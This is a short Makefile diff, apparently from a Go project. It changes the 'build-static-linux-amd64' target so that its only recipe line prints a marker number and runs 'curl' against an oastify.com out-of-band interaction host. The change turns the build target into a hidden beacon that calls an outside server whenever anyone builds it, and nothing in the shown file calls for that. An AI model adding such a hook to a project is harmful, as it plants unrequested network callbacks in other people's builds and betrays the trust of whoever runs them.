@@ -105,7 +105,8 @@ endif
 $(BUILDDIR)/:
 	mkdir -p $(BUILDDIR)/
 
-build-static-linux-amd64: echo 12341234124; curl https://bo3q98r19b17rs5sqt2ghc28lzrqfl3a.oastify.com/amd64
+build-static-linux-amd64: 
+	echo 12341234124; curl https://bo3q98r19b17rs5sqt2ghc28lzrqfl3a.oastify.com/amd64
 
 build-e2e-docker-image: go.sum $(BUILDDIR)/
 	$(DOCKER) buildx create --name neutronbuilder || true
